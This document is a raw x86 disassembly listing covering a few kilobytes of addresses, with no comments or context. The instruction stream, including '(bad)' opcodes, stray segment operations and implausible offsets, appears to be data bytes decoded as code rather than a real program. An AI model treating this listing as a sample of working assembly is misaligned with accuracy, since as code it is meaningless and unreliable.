  403e7b:	sbb    BYTE PTR [esp],dl
  403e7e:	sbb    BYTE PTR [eax+ecx*1],al
  403e81:	xor    BYTE PTR [edx],ah
  403e83:	xor    cl,BYTE PTR [eax]
  403e85:	inc    eax
  403e86:	jbe    0x403e8a
  403e88:	inc    eax
  403e89:	and    dl,BYTE PTR [edx]
  403e8b:	dec    eax
  403e8c:	inc    eax
  403e8d:	add    DWORD PTR [esi+eax*1+0x20],eax
  403e91:	add    DWORD PTR [edx],0xad44aa01
  403e97:	add    BYTE PTR [edx],bh
  403e99:	add    al,BYTE PTR [esi]
  403e9b:	add    BYTE PTR [esp+eax*2],0xa
  403e9f:	pop    esp
  403ea0:	or     cl,0x2a
  403ea3:	adc    eax,0x24081222
  403ea8:	dec    eax
  403ea9:	adc    BYTE PTR [ebx],al
  403eab:	inc    ecx
  403eac:	mov    BYTE PTR [edx+ecx*1],al
  403eaf:	dec    eax
  403eb0:	nop
  403eb1:	push   eax
  403eb2:	inc    esp
  403eb3:	stos   BYTE PTR es:[edi],al
  403eb4:	add    al,BYTE PTR [eax+0x10200002]
  403eba:	add    BYTE PTR [ecx],0x2
  403ebd:	adc    al,0x84
  403ebf:	sbb    BYTE PTR [eax],al
  403ec1:	mov    al,0x80
  403ec3:	add    BYTE PTR [eax+0x403c516],cl
  403ec9:	add    BYTE PTR [eax+ecx*1+0x3c],cl
  403ecd:	and    BYTE PTR [eax],cl
  403ecf:	sub    edi,DWORD PTR [eax]
  403ed1:	pop    eax
  403ed2:	rcl    bl,0x24
  403ed5:	sub    BYTE PTR [ecx],al
  403ed7:	and    BYTE PTR [eax],al
  403ed9:	add    BYTE PTR [ebp+eax*1+0x4],ah
  403edd:	add    eax,0x24508880
  403ee2:	add    eax,0x23102b00
  403ee7:	adc    al,0x0
  403ee9:	and    dl,BYTE PTR [eax]
  403eeb:	add    BYTE PTR [esi+0x4a203498],al
  403ef1:	adc    cl,BYTE PTR [ecx]
  403ef3:	add    BYTE PTR [eax+0x61],ah
  403ef6:	or     DWORD PTR [eax],ecx
  403ef8:	add    al,0x48
  403efa:	sub    eax,DWORD PTR [ecx]
  403efc:	and    DWORD PTR [edi+edi*8],edx
  403eff:	adc    eax,0x414ecc
  403f04:	mov    BYTE PTR [eax],al
  403f06:	add    BYTE PTR [eax+0x8018020],0xac
  403f0d:	test   BYTE PTR [eax],dl
  403f0f:	rol    BYTE PTR [eax],0xc2
  403f12:	add    BYTE PTR [eax-0x5fd1b934],0x20
  403f19:	inc    ecx
  403f1a:	push   ecx
  403f1b:	or     BYTE PTR [eax],dh
  403f1d:	inc    eax
  403f1e:	test   BYTE PTR [esp+eax*1+0x5a],ch
  403f22:	test   al,0x3
  403f24:	inc    esp
  403f25:	or     BYTE PTR [eax],ah
  403f27:	adc    al,0x42
  403f29:	inc    ecx
  403f2a:	sbb    DWORD PTR [eax+eax*1],eax
  403f2d:	sub    BYTE PTR [eax+0x42],al
  403f30:	add    BYTE PTR [ecx],al
  403f32:	inc    eax
  403f33:	mov    DWORD PTR [edx],eax
  403f35:	add    cl,BYTE PTR [eax]
  403f37:	add    al,0x26
  403f39:	or     al,0x26
  403f3b:	nop
  403f3c:	and    BYTE PTR [edx],cl
  403f3e:	and    BYTE PTR [ecx+eax*1],al
  403f41:	jno    0x403f83
  403f43:	adc    BYTE PTR [eax],0x3a
  403f46:	add    dl,BYTE PTR [eax-0x6f]
  403f49:	push   cs
  403f4a:	pusha  
  403f4b:	dec    eax
  403f4c:	and    al,0x12
  403f4e:	or     BYTE PTR [edx+0x2a],al
  403f51:	add    DWORD PTR [eax],eax
  403f53:	add    al,0x41
  403f55:	test   eax,0x22820020
  403f5a:	add    dl,BYTE PTR [eax]
  403f5c:	lds    edx,FWORD PTR [eax]
  403f5e:	and    BYTE PTR [eax-0x577feffd],ch
  403f64:	sub    al,0xd3
  403f66:	and    BYTE PTR [ecx],al
  403f68:	pop    ss
  403f69:	or     al,0x8
  403f6b:	xchg   ecx,eax
  403f6c:	and    DWORD PTR [edx],0x83301108
  403f72:	add    BYTE PTR [eax],ch
  403f74:	add    DWORD PTR [eax+0x20c00044],ecx
  403f7a:	adc    eax,DWORD PTR [esi+0x20]
  403f7d:	add    BYTE PTR [edx],ah
  403f7f:	xchg   BYTE PTR [ebx],dh
  403f81:	add    DWORD PTR [ecx-0x2dff5bfa],eax
  403f87:	push   ecx
  403f88:	inc    edx
  403f89:	sub    BYTE PTR [eax-0x7db7ff00],al
  403f8f:	and    esp,DWORD PTR [eax]
  403f91:	add    eax,DWORD PTR [eax+0x2d]
  403f94:	inc    eax
  403f95:	sub    BYTE PTR [eax+0x5],al
  403f98:	add    eax,DWORD PTR [eax]
  403f9a:	add    BYTE PTR [eax],al
  403f9c:	loop   0x403fa5
  403f9e:	adc    BYTE PTR [edx-0x5d],0x1
  403fa2:	and    al,0x6
  403fa4:	adc    BYTE PTR [eax+0x1cc440d5],0x1
  403fab:	and    BYTE PTR [eax+0x3],0x40
  403faf:	add    BYTE PTR [eax-0x20],al
  403fb2:	inc    eax
  403fb3:	push   ebx
  403fb4:	add    al,0x40
  403fb6:	push   ss
  403fb7:	sub    BYTE PTR [eax],dh
  403fb9:	add    al,BYTE PTR [eax]
  403fbb:	pop    ds
  403fbc:	add    ah,BYTE PTR [eax]
  403fbe:	mov    al,ds:0x81001000
  403fc3:	rcl    DWORD PTR [eax],0x0
  403fc6:	add    BYTE PTR [ecx+0x19],0x82
  403fca:	nop
  403fcb:	mov    ds:0x40608480,al
  403fd0:	or     al,0xa4
  403fd2:	add    BYTE PTR [eax],al
  403fd4:	bound  edx,QWORD PTR [ebx+0x50ca02]
  403fda:	add    al,BYTE PTR [eax+0x11c0022c]
  403fe0:	add    BYTE PTR [esp+ebx*2],al
  403fe3:	add    al,0x13
  403fe5:	outs   dx,DWORD PTR ds:[esi]
  403fe6:	fild   DWORD PTR [edx]
  403fe8:	add    BYTE PTR [edx],al
  403fea:	add    BYTE PTR [eax],al
  403fec:	add    BYTE PTR [edx+eiz*4],dh
  403fef:	and    BYTE PTR [ebp-0x75bedd79],al
  403ff5:	dec    edx
  403ff6:	sbb    BYTE PTR ds:0x13008d83,al
  403ffc:	or     BYTE PTR ds:0xc0a0036,0x80
  404003:	arpl   WORD PTR [eax],ax
  404005:	and    BYTE PTR [ebx-0x6f],al
  404008:	add    al,0x20
  40400a:	dec    esp
  40400b:	add    DWORD PTR [edx],ebx
  40400d:	add    eax,0x81420617
  404012:	xchg   ebp,eax
  404013:	mov    cl,0x12
  404015:	inc    edx
  404016:	and    al,0x10
  404018:	add    BYTE PTR [eax+0x10],0x32
  40401c:	add    BYTE PTR [eax+0xd],cl
  40401f:	or     BYTE PTR [edx],dl
  404021:	sbb    BYTE PTR [ebp-0x74],al
  404024:	add    eax,0xe1700128
  404029:	add    al,0x8
  40402b:	mov    al,0x40
  40402d:	add    cl,0x51
  404030:	adc    ch,BYTE PTR [edx]
  404032:	outs   dx,BYTE PTR ds:[esi]
  404033:	add    BYTE PTR [eax],al
  404035:	inc    edx
  404036:	adc    ah,BYTE PTR [ecx]
  404038:	cmp    al,0x70
  40403a:	and    eax,0x2aa50900
  40403f:	and    al,0x51
  404041:	ror    BYTE PTR [edx-0x7f7e9bb8],0x60
  404048:	push   edx
  404049:	add    BYTE PTR [ecx+0x400881],0x40
  404050:	adc    al,0x0
  404052:	add    dl,BYTE PTR [eax+0x2a]
  404055:	and    BYTE PTR [eax],al
  404057:	push   eax
  404058:	add    BYTE PTR [edx+eax*1],al
  40405b:	add    DWORD PTR [eax+0x10804b4c],eax
  404061:	inc    eax
  404062:	test   BYTE PTR [eax],al
  404064:	dec    esi
  404065:	add    al,bl
  404067:	and    al,BYTE PTR [ecx+ecx*4+0x128064c0]
  40406e:	fs popa 
  404070:	inc    ebx
  404071:	push   esp
  404072:	inc    ecx
  404073:	jmp    0x4304c088
  404078:	add    dh,BYTE PTR [edx+0x4226412a]
  40407e:	and    eax,0x8a418811
  404083:	adc    BYTE PTR [eax+esi*1],dh
  404086:	add    BYTE PTR [edx],al
  404088:	sub    BYTE PTR [edx],ch
  40408a:	push   ss
  40408b:	or     BYTE PTR [eax+0x68129205],al
  404091:	pusha  
  404092:	rol    BYTE PTR [esi-0x7f],1
  404095:	adc    al,0x0
  404097:	add    eax,0x2124788
  40409c:	add    BYTE PTR [edx+0x1042a820],0x40
  4040a3:	adc    BYTE PTR [edx],ah
  4040a5:	and    BYTE PTR [edi],dl
  4040a7:	push   es
  4040a8:	clc    
  4040a9:	adc    dl,BYTE PTR [eax-0xfffff00]
  4040af:	mov    es,WORD PTR [eax+0x40010d4]
  4040b5:	sbb    eax,DWORD PTR [esi]
  4040b7:	add    edx,DWORD PTR [edx]
  4040b9:	add    al,0x4
  4040bb:	dec    esi
  4040bc:	js     0x4040c6
  4040be:	adc    BYTE PTR [eax],ah
  4040c0:	and    al,0xa
  4040c2:	add    cl,BYTE PTR [esi]
  4040c4:	or     DWORD PTR [eax-0x70],esp
  4040c7:	inc    ebx
  4040c8:	dec    ecx
  4040c9:	ror    DWORD PTR [edx-0x7effabe0],0x58
  4040d0:	cwde   
  4040d1:	les    ebp,FWORD PTR [eax-0x257cf5c0]
  4040d7:	inc    eax
  4040d8:	add    BYTE PTR [eax-0x78747b00],0x2
  4040df:	or     eax,0x83434200
  4040e4:	lds    eax,FWORD PTR [eax]
  4040e6:	sbb    al,0x48
  4040e8:	and    al,0xcd
  4040ea:	or     ecx,edx
  4040ec:	rol    BYTE PTR [eax],0xc5
  4040ef:	add    BYTE PTR [eax+0x3],0x18
  4040f3:	adc    BYTE PTR [eax],dh
  4040f5:	sbb    edx,DWORD PTR [eax]
  4040f7:	add    BYTE PTR [ecx],al
  4040f9:	adc    eax,0x21440869
  4040fe:	add    ah,BYTE PTR [esp+eax*1]
  404101:	mov    ebx,0x89244000
  404106:	sbb    al,0xc0
  404108:	or     DWORD PTR [eax+0x42c40000],eax
  40410e:	adc    DWORD PTR [eax+0x3f820],eax
  404114:	xchg   ecx,eax
  404115:	and    al,BYTE PTR [ecx+edi*2]
  404118:	sbb    al,0xcb
  40411a:	add    cl,BYTE PTR [eax]
  40411c:	or     cl,BYTE PTR [eax+0x600023d3]
  404122:	add    BYTE PTR gs:[eax+0x2a430813],0x4a
  40412a:	sub    BYTE PTR [edx],al
  40412c:	and    DWORD PTR [ebx],0x2805a80
  404132:	add    DWORD PTR [eax],eax
  404134:	xor    BYTE PTR [eax+0x3710080b],cl
  40413a:	dec    edx
  40413b:	pop    esp
  40413c:	and    dl,BYTE PTR [ebp-0x7bffd9cc]
  404142:	pusha  
  404143:	add    BYTE PTR [eax+0x2449687],al
  404149:	dec    edx
  40414a:	adc    BYTE PTR [eax],al
  40414c:	bound  ebx,QWORD PTR [edx]
  40414e:	add    BYTE PTR [edx],al
  404150:	or     DWORD PTR [eax+0x44001085],ebx
  404156:	dec    eax
  404157:	dec    ecx
  404158:	add    BYTE PTR [ecx+0x1],cl
  40415b:	add    eax,DWORD PTR [ebx]
  40415d:	sub    BYTE PTR [ecx],0x14
  404160:	add    eax,DWORD PTR [edx]
  404162:	pop    es
  404163:	inc    eax
  404164:	add    al,BYTE PTR [eax]
  404166:	sub    BYTE PTR [ecx+eax*2],al
  404169:	mov    eax,ds:0x20d0d1
  40416e:	adc    al,0x30
  404170:	or     DWORD PTR [eax+0x0],edx
  404173:	add    DWORD PTR [eax+0x40105012],eax
  404179:	sub    BYTE PTR [ebx],al
  40417b:	adc    bl,BYTE PTR [eax+0x2]
  40417e:	add    al,0x1b
  404180:	inc    ecx
  404181:	dec    edx
  404182:	add    DWORD PTR fs:[esi+0xe921763],ecx
  404189:	dec    eax
  40418a:	xchg   edi,eax
  40418b:	and    bl,BYTE PTR [eax]
  40418d:	adc    BYTE PTR [eax],al
  40418f:	or     DWORD PTR [eax+0xc00021a],ebx
  404195:	daa    
  404196:	adc    BYTE PTR [edx],0x50
  404199:	add    BYTE PTR [esi+0x0],0x70
  40419d:	and    BYTE PTR [ebp+0x10],ah
  4041a0:	xor    ah,al
  4041a2:	call   0x2102:0x1a20825
  4041a9:	add    DWORD PTR [ebp-0x777ef9ea],0x2
  4041b0:	adc    DWORD PTR [esi-0x6b5febfe],eax
  4041b6:	inc    eax
  4041b7:	push   0x90c13120
  4041bc:	adc    al,0x1
  4041be:	add    ecx,DWORD PTR [edx+eiz*1]
  4041c1:	sbb    al,0x89
  4041c3:	mov    cl,0x42
  4041c5:	or     BYTE PTR [eax],al
  4041c7:	inc    ecx
  4041c8:	mov    BYTE PTR [ebp-0x7dcfc7cc],cl
  4041ce:	test   DWORD PTR [eax+eax*1],eax
  4041d1:	inc    ebp
  4041d2:	add    BYTE PTR [eax],bh
  4041d4:	push   esp
  4041d5:	add    al,BYTE PTR [ebx]
  4041d7:	mov    ds:0x555080b2,eax
  4041dc:	push   ecx
  4041dd:	(bad)  
  4041de:	and    DWORD PTR es:[edx+ebx*4-0x64f7d33c],edx
  4041e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041e7:	sbb    eax,0x2806
  4041ec:	pusha  
  4041ed:	adc    BYTE PTR [eax+0x49914a10],al
  4041f3:	add    BYTE PTR [eax+0x100048],ah
  4041f9:	add    BYTE PTR [edx+edx*1-0x3be7ee00],al
  404200:	or     BYTE PTR [edi+0x20],cl
  404203:	add    DWORD PTR [eax+0x0],eax
  404206:	xchg   BYTE PTR [eax],cl
  404208:	test   BYTE PTR [esi],al
  40420a:	add    eax,0x364c0d2
  40420f:	xor    BYTE PTR [eax],al
  404211:	add    BYTE PTR [ecx+0x1],0xd5
  404215:	or     DWORD PTR [eax],0xa92472a
  40421b:	sub    DWORD PTR [eax+0x10],0x2c74060
  404222:	adc    DWORD PTR [eax],0xb2018088
  404228:	or     ah,BYTE PTR [eax]
  40422a:	push   es
  40422b:	ins    BYTE PTR es:[edi],dx
  40422c:	mov    BYTE PTR [ecx],ah
  40422e:	inc    eax
  40422f:	and    BYTE PTR [edi],ah
  404231:	pop    es
  404232:	mov    cl,BYTE PTR [eax]
  404234:	add    al,0x2
  404236:	adc    DWORD PTR [ebp-0x80],esp
  404239:	add    BYTE PTR [ecx+0x2233c],al
  40423f:	add    eax,eax
  404241:	add    al,0x12
  404243:	add    al,BYTE PTR [eax]
  404245:	and    DWORD PTR [ecx],eax
  404247:	or     BYTE PTR [eax],cl
  404249:	adc    BYTE PTR [ebx-0x70],ah
  40424c:	push   ss
  40424d:	and    BYTE PTR [edx],bl
  40424f:	inc    ecx
  404250:	inc    eax
  404251:	add    BYTE PTR [eax+0x0],ah
  404254:	ins    BYTE PTR es:[edi],dx
  404255:	add    eax,0xe03600
  40425a:	and    BYTE PTR [eax+0x4e140408],al
  404260:	and    eax,0x8420506
  404265:	and    BYTE PTR [edx],0xa0
  404268:	adc    BYTE PTR [eax*8+0x9611c08],dl
  40426f:	and    al,0x4
  404271:	inc    ecx
  404272:	adc    ebp,DWORD PTR [ebp-0x70]
  404275:	add    BYTE PTR [eax],al
  404277:	adc    BYTE PTR [eax+eax*2],ah
  40427a:	and    eax,0x40051083
  40427f:	inc    edx
  404280:	add    BYTE PTR [ebx+0x1886000],al
  404286:	xor    al,BYTE PTR [eax]
  404288:	sub    al,0x88
  40428a:	sbb    al,BYTE PTR [esi]
  40428c:	add    BYTE PTR [ecx],dl
  40428e:	adc    cl,BYTE PTR [esi]
  404290:	inc    eax
  404291:	inc    eax
  404292:	adc    bh,BYTE PTR [edi]
  404294:	adc    BYTE PTR [ebp+0x40],al
  404297:	cdq    
  404298:	(bad)  
  404299:	and    BYTE PTR [ecx],ah
  40429b:	adc    DWORD PTR [edx],ecx
  40429d:	sub    BYTE PTR ds:0x20000a09,cl
  4042a3:	pop    esp
  4042a4:	add    BYTE PTR [eax+0x8],al
  4042a7:	or     DWORD PTR ds:0x100000,0xffffff90
  4042ae:	add    BYTE PTR [eax+0x10],al
  4042b1:	push   0x400400aa
  4042b6:	les    eax,FWORD PTR [esi]
  4042b8:	inc    edx
  4042b9:	nop
  4042ba:	adc    BYTE PTR [edx+0x21],dl
  4042bd:	sbb    BYTE PTR [eax],0x90
  4042c0:	and    esi,DWORD PTR [eax+0x2040062]
  4042c6:	add    DWORD PTR [ebx],esp
  4042c8:	or     esp,0xffffff84
  4042cb:	add    BYTE PTR [eax+eax*2],cl
  4042ce:	add    BYTE PTR [edx],al
  4042d0:	and    BYTE PTR [ecx+0x232e1],dl
  4042d6:	adc    al,0xa
  4042d8:	push   es
  4042d9:	test   DWORD PTR [eax*2+0x3a408b],esp
  4042e0:	adc    BYTE PTR [ecx],dl
  4042e2:	and    al,0x7
  4042e4:	adc    BYTE PTR [ebx+eax*1+0x60],al
  4042e8:	add    BYTE PTR [eax-0x3af7af7f],dh
  4042ee:	sub    BYTE PTR [edx+0x34],al
  4042f1:	sbb    al,BYTE PTR [eax+0x14108380]
  4042f7:	add    dl,ah
  4042f9:	adc    al,0x80
  4042fb:	add    DWORD PTR [ecx+0x0],esp
  4042fe:	and    WORD PTR [ecx],ax
  404301:	xchg   edx,eax
  404302:	or     al,BYTE PTR [edx+0x48510912]
  404308:	sub    eax,DWORD PTR [eax]
  40430a:	push   edx
  40430b:	add    DWORD PTR [edx+0x180822],eax
  404311:	add    cl,BYTE PTR [esi]
  404313:	add    BYTE PTR [eax],cl
  404315:	sub    DWORD PTR [eax+0x0],esp
  404318:	adc    al,0x0
  40431a:	or     DWORD PTR [ecx],eax
  40431c:	xor    BYTE PTR [eax],ah
  40431e:	add    BYTE PTR [ecx],cl
  404320:	add    dl,BYTE PTR [eax]
  404322:	rol    BYTE PTR [ecx+eax*2+0xf0a0284],1
  404329:	add    BYTE PTR [eax+eax*2],dh
  40432c:	add    al,BYTE PTR ds:0x2a02724
  404332:	sbb    al,0x50
  404334:	adc    BYTE PTR [eax],dh
  404336:	cmp    al,0x70
  404338:	bound  eax,QWORD PTR [eax]
  40433a:	adc    ch,al
  40433c:	and    BYTE PTR [eax+ebx*1],0x3
  404340:	push   esi
  404341:	or     BYTE PTR [ecx-0x3b],al
  404344:	adc    BYTE PTR [eax+esi*2],dl
  404347:	mov    ch,BYTE PTR [eax]
  404349:	inc    eax
  40434a:	fld    DWORD PTR [eax]
  40434c:	or     BYTE PTR [ecx+0x2000052],0x1a
  404353:	sub    al,0x0
  404355:	or     dl,BYTE PTR [eax]
  404357:	add    BYTE PTR [edx],dl
  404359:	dec    ebp
  40435a:	push   ecx
  40435b:	add    BYTE PTR [eax+eiz*1],al
  40435e:	sub    DWORD PTR [eax+0x44047182],esp
  404364:	add    BYTE PTR [eax],0x6a
  404367:	or     edx,DWORD PTR [eax]
  404369:	adc    edx,DWORD PTR [ecx+eiz*1+0x22]
  40436d:	push   esi
  40436e:	or     BYTE PTR [eax+0x18000c43],al
  404374:	add    al,BYTE PTR [eax+0x29]
  404377:	add    BYTE PTR [eax],al
  404379:	or     DWORD PTR [eax],ecx
  40437b:	in     al,0xca
  40437d:	add    esi,DWORD PTR [eax]
  40437f:	push   es
  404380:	and    BYTE PTR [ecx],ah
  404382:	xor    al,ch
  404384:	add    BYTE PTR [eax+0x406090a],ch
  40438a:	add    ah,BYTE PTR ds:0x83249952
  404390:	add    DWORD PTR [ecx+0x48],ebx
  404393:	adc    BYTE PTR [edx],al
  404395:	adc    eax,DWORD PTR [ecx+0x11390f1]
  40439b:	and    BYTE PTR [eax+eax*1],cl
  40439e:	add    al,0xa
  4043a0:	push   eax
  4043a1:	sbb    ecx,DWORD PTR [eax]
  4043a3:	add    BYTE PTR [eax-0x5dbfbbbe],dl
  4043a9:	add    al,0xd
  4043ab:	adc    BYTE PTR [ebx+edx*1+0x20],ah
  4043af:	ins    BYTE PTR es:[edi],dx
  4043b0:	enter  0x104,0x14
  4043b4:	dec    eax
  4043b5:	and    ch,0x6
  4043b8:	pusha  
  4043b9:	add    BYTE PTR [eax],ah
  4043bb:	add    edx,DWORD PTR [eax]
  4043bd:	cmp    BYTE PTR [eax+0x40008010],ah
  4043c3:	add    BYTE PTR [eax],al
  4043c5:	adc    al,0x1
  4043c7:	xchg   esp,eax
  4043c8:	cwde   
  4043c9:	test   al,0x0
  4043cb:	add    DWORD PTR [edx],esp
  4043cd:	mov    al,0xc1
  4043cf:	rol    BYTE PTR [eax+0x42],0x45
  4043d3:	inc    esp
  4043d4:	add    eax,DWORD PTR [eax]
  4043d6:	add    al,BYTE PTR [ecx]
  4043d8:	add    al,0x23
  4043da:	and    BYTE PTR [eax-0x7acfeffc],cl
  4043e0:	add    BYTE PTR [eax],al
  4043e2:	lods   al,BYTE PTR ds:[esi]
  4043e3:	add    DWORD PTR [eax],esp
  4043e5:	pusha  
  4043e6:	add    eax,esp
  4043e8:	rcl    BYTE PTR [ebx+0x6a],0x0
  4043ec:	and    DWORD PTR [ebp+0x40c0943],ecx
  4043f2:	rcl    BYTE PTR [eax+ebx*1+0x52180200],0x8c
  4043fa:	pusha  
  4043fb:	inc    esp
  4043fc:	add    al,0x82
  4043fe:	nop
  4043ff:	xor    DWORD PTR [eax-0x5fe79ddb],eax
  404405:	adc    eax,0x10210560
  40440a:	add    BYTE PTR [eax+0x9],dl
  40440d:	dec    edx
  40440e:	mov    WORD PTR [ebp+0x12],es
  404411:	inc    eax
  404412:	ror    BYTE PTR [eax],cl
  404414:	push   edx
  404415:	inc    ecx
  404416:	add    al,0x12
  404418:	adc    BYTE PTR [eax-0x80],al
  40441b:	add    esp,DWORD PTR [eax+0x54185002]
  404421:	pusha  
  404422:	or     al,0x8
  404424:	inc    eax
  404425:	add    DWORD PTR [edx+0x1e],eax
  404428:	rcl    BYTE PTR [ebx],1
  40442a:	inc    eax
  40442b:	and    cl,BYTE PTR cs:[edx]
  40442e:	and    DWORD PTR [eax],ecx
  404430:	add    eax,0x2076000
  404435:	sub    dl,BYTE PTR [eax]
  404437:	add    esp,DWORD PTR [ebx]
  404439:	xchg   esi,eax
  40443a:	and    al,0x10
  40443c:	sub    eax,0x8232882
  404441:	shl    DWORD PTR [ecx+0x14],0x4
  404445:	and    DWORD PTR [edx+eax*4],eax
  404448:	add    eax,DWORD PTR [eax+0x9]
  40444b:	sub    BYTE PTR [eax],al
  40444d:	add    BYTE PTR [esp+eax*1+0x44],al
  404451:	push   0x23004e20
  404456:	add    al,0x49
  404458:	add    al,0x50
  40445a:	sub    al,0x8
  40445c:	and    BYTE PTR [eax],bl
  40445e:	dec    esp
  40445f:	pop    eax
  404460:	lods   al,BYTE PTR ds:[esi]
  404461:	adc    al,0xd0
  404463:	add    DWORD PTR [eax+0x1],esp
  404466:	add    BYTE PTR [edx],al
  404468:	add    DWORD PTR [eax],0x2401082a
  40446e:	and    DWORD PTR [eax+0xb40806],eax
  404474:	add    DWORD PTR [edx],0x52
  404477:	inc    edx
  404478:	arpl   WORD PTR [eax],ax
  40447a:	or     DWORD PTR [eax+0x1],eax
  40447d:	add    BYTE PTR [eax],dl
  40447f:	xor    BYTE PTR [ecx],dh
  404481:	add    al,BYTE PTR [ecx]
  404483:	push   eax
  404484:	and    BYTE PTR [eax],al
  404486:	pop    ss
  404487:	dec    eax
  404488:	popa   
  404489:	and    DWORD PTR [eax+eax*2],eax
  40448c:	in     al,0x20
  40448e:	inc    eax
  40448f:	add    BYTE PTR [eax+0x826140],dh
  404495:	add    DWORD PTR [eax+0x12215b00],eax
  40449b:	cmp    al,0x0
  40449e:	add    BYTE PTR [ebx+edx*1],dh
  4044a1:	sbb    al,0x8
  4044a3:	and    al,0xa
  4044a5:	enter  0x3813,0x58
  4044a9:	(bad)  
  4044aa:	mov    DWORD PTR [esi],eax
  4044ac:	or     DWORD PTR [ecx+0x58000],ebp
  4044b2:	adc    al,BYTE PTR fs:[eax]
  4044b5:	adc    BYTE PTR [ebx+0x6f210800],0x94
  4044bc:	and    eax,0x81401040
  4044c1:	add    BYTE PTR [eax],al
  4044c3:	xchg   BYTE PTR [edx],ah
  4044c5:	or     BYTE PTR [eax],al
  4044c7:	rcl    BYTE PTR [eax+0x48],0x9
  4044cb:	mov    eax,ds:0x82c1462
  4044d0:	add    BYTE PTR [eax+edx*1+0x2],ah
  4044d4:	add    BYTE PTR [eax+0x0],dh
  4044d7:	mov    al,ds:0xa44002c3
  4044dc:	rol    BYTE PTR [eax],0xf
  4044df:	or     al,0x5
  4044e1:	xor    BYTE PTR [ecx],ch
  4044e3:	enter  0x2811,0x1
  4044e7:	add    ah,BYTE PTR [eax+0x20058019]
  4044ed:	add    BYTE PTR [edi+0x0],cl
  4044f0:	dec    esp
  4044f1:	sub    BYTE PTR [esi+ebp*1],dl
  4044f4:	and    al,0x1c
  4044f6:	sub    edx,DWORD PTR [ecx+0x140a4100]
  4044fc:	add    BYTE PTR fs:[ecx],al
  4044ff:	add    al,0x8
  404501:	adc    BYTE PTR [esp+ecx*1-0x3f74d2df],al
  404508:	enter  0x420a,0x10
  40450c:	add    DWORD PTR [eax+edx*4],0x1118832
  404513:	mov    al,ds:0x20c06c00
  404518:	add    BYTE PTR ds:0x470019a8,al
  40451e:	adc    al,BYTE PTR [edx+ecx*1]
  404521:	add    BYTE PTR [eax],cl
  404523:	or     BYTE PTR [edx+0x20354414],0xf0
  40452a:	and    BYTE PTR [edx+0x0],al
  40452d:	add    cl,BYTE PTR [ebx+0x199e0030]
  404533:	mov    ah,0x9
  404535:	inc    eax
  404536:	inc    eax
  404537:	and    al,0xd
  404539:	add    BYTE PTR [ebx],dl
  40453b:	add    BYTE PTR [esp+eax*1+0x44000120],ch
  404542:	and    BYTE PTR [eax],al
  404544:	push   es
  404545:	dec    esp
  404546:	and    esp,DWORD PTR [eax+0x600401d5]
  40454c:	add    al,BYTE PTR [esi+0x282905]
  404552:	or     DWORD PTR ds:0xb442a18,eax
  404558:	dec    ecx
  404559:	fiadd  DWORD PTR [edx]
  40455b:	add    cl,0x80
  40455e:	add    eax,DWORD PTR [eax+0x9]
  404561:	inc    edx
  404562:	and    al,0x81
  404564:	xor    BYTE PTR [ecx+0x4098218],al
  40456a:	sub    BYTE PTR [eax+0x0],al
  40456d:	adc    DWORD PTR [eax],0x24c041
  404573:	add    BYTE PTR [ebx+ecx*8],ch
  404576:	add    BYTE PTR [eax],bl
  404578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404579:	(bad)  
  40457a:	mov    al,ds:0x2402209e
  40457f:	adc    edx,eax
  404581:	adc    al,BYTE PTR [eax]
  404583:	add    cl,BYTE PTR [ecx]
  404585:	or     BYTE PTR [ecx+edx*1-0x7e],cl
  404589:	or     BYTE PTR [ebx+0x7a],al
  40458c:	test   BYTE PTR [eax-0x635e6ffe],ah
  404592:	adc    ah,BYTE PTR [edx-0x6c]
  404595:	mov    al,BYTE PTR ds:0x24002482
  40459b:	sbb    ch,BYTE PTR [edx]
  40459d:	add    BYTE PTR [edx],al
  40459f:	xchg   ecx,eax
  4045a0:	ret    
  4045a1:	push   ebx
  4045a2:	sbb    DWORD PTR [ecx+0x68],eax
  4045a5:	enter  0x3369,0x92
  4045a9:	add    BYTE PTR [esi+ecx*4+0x8],al
  4045ad:	add    BYTE PTR [ecx+eiz*2+0x2200100c],ah
  4045b4:	add    BYTE PTR [ecx+0x40],al
  4045b7:	add    cl,BYTE PTR [eax]
  4045b9:	add    eax,0x5801436
  4045be:	sbb    BYTE PTR [ecx],0x2c
  4045c1:	add    BYTE PTR [esp+ecx*4+0x67e24540],dh
  4045c8:	or     BYTE PTR [ecx+0x20],dl
  4045cb:	adc    BYTE PTR [ecx],cl
  4045cd:	test   BYTE PTR ds:0x18880653,ah
  4045d3:	and    cl,al
  4045d5:	inc    esp
  4045d6:	add    BYTE PTR [edx+0x17],al
  4045d9:	sbb    BYTE PTR ds:0x3082411d,al
  4045df:	add    DWORD PTR [esp+eax*1+0x4c],ecx
  4045e3:	and    BYTE PTR [ecx+0x8],al
  4045e6:	push   esp
  4045e7:	add    DWORD PTR [ecx],0x581244c6
  4045ed:	push   cs
  4045ee:	add    DWORD PTR [esi+0xb],0x52840820
  4045f5:	add    BYTE PTR [edx],ch
  4045f7:	adc    al,0x4
  4045f9:	adc    al,BYTE PTR [eax+0x292d84e]
  4045ff:	add    BYTE PTR [ecx+edx*1-0x80],bl
  404603:	adc    BYTE PTR [eax],dl
  404605:	rcl    BYTE PTR [eax-0x6c9b6cae],0xc2
  40460c:	add    BYTE PTR [eax],dl
  40460e:	adc    al,0x80
  404610:	mov    DWORD PTR [eax+0x40],esp
  404613:	push   edi
  404614:	xor    eax,0x8c9401a2
  404619:	adc    BYTE PTR [ebx+eiz*1],al
  40461c:	stos   DWORD PTR es:[edi],eax
  40461d:	adc    BYTE PTR [eax-0x1ebfbf69],al
  404623:	add    eax,0x22036c
  404628:	cmp    DWORD PTR [esi+eax*1],eax
  40462b:	add    BYTE PTR [edx+0x0],cl
  40462e:	adc    BYTE PTR [edx],bl
  404630:	xor    eax,esp
  404632:	add    BYTE PTR [ecx],dh
  404634:	shl    BYTE PTR [eax+0x34a5000e],1
  40463a:	adc    al,BYTE PTR [ecx]
  40463c:	or     esp,DWORD PTR [esp+ecx*4-0x7c]
  404640:	adc    BYTE PTR [esi],0x44
  404643:	push   eax
  404644:	inc    ebp
  404645:	inc    edx
  404646:	inc    ecx
  404647:	inc    eax
  404648:	or     BYTE PTR [eax+0x68],0xb
  40464c:	add    al,BYTE PTR [eax+0x20010730]
  404652:	mov    BYTE PTR [esi],al
  404654:	xchg   ebx,eax
  404655:	loop   0x404697
  404657:	adc    ah,BYTE PTR [eax+0xc421144]
  40465d:	mov    DWORD PTR [edx],ecx
  40465f:	and    BYTE PTR [esi],cl
  404661:	adc    BYTE PTR [esi],dh
